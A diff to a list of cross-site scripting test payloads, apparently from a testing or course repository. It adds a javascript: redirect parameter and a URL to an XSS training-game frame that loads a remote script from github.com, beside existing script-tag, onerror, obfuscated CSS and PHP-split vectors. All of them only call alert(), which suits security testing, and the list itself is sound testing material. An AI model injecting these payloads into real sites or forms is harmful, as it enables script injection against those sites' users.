@@ -1,7 +1,10 @@
-'); alert('XSS
 <script>alert(1);</script>
 <Img src = x onerror="javascript:alert(1)">
 #3' onerror='alert("xss")'
+');alert('xss
+/signup?next=javascript:alert("xss");
+https://xss-game.appspot.com/level6/frame#htTps:/github.com/Amlet86/Otus/tree/master/src/test/resources/xss/alert.js
+
 <style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
 <? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
 <marquee><script>alert('XSS')</script></marquee>
